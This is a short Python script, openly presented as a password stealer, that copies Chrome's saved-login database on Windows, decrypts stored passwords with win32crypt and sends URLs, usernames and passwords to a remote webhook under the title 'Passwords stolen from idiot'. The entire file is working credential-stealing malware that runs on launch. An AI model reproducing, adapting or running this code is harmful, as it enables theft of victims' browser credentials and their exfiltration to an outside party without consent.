#Made by the meme factory
#Copyright 2018

#Imports
import os
import sqlite3
import win32crypt
import sys
import shutil
from webhook import *

#Variables
webhook = Webhook("id","token")

#Classes
class SQLite3connection:
	def __init__(self,path):
		try:
			self.connection = sqlite3.connect(path)
			self.cursor = self.connection.cursor()
		except:
			sys.exit()
	def run(self,query):
		self.cursor.execute(query)
		return self.cursor.fetchall()
	def close(self):
		self.connection.close()

class PasswordStealer:
	def __init__(self):
		src = os.path.realpath(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
		copy = shutil.copy(src,os.getenv("USERPROFILE") + "\\Desktop\\stealer.bak")
		self.path = copy
		self.connection = SQLite3connection(self.path)
	def steal(self):
		data = self.connection.run("SELECT action_url, username_value, password_value FROM logins")
		stolen = []
		if len(data) > 0:
			for result in data:
				url = result[0]
				username = result[1]
				try:
					password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
				except:
					print("nopass")
					pass
				if password:
					stolen.append({
						"url": url,
						"username": username,
						"password": password
					})
		else:
			sys.exit()
		self.connection.close()
		os.remove(self.path)
		return stolen

#Functions
def main():
	stealer = PasswordStealer()
	stolenpasswords = stealer.steal()
	fields = []
	for v in stolenpasswords:
		fields.append({
			"name": str(v["url"]),
			"value": "**Username:** " + str(v["username"]) + "\n**Password:** " + str(v["password"])
		})
	embed = {
		"title": "Passwords stolen from idiot",
		"fields": fields,
		"footer": {
			"text": "Made by the meme factory"
		}
	}
	webhook.send("Stolen passwords",embed=embed)

#Run
main()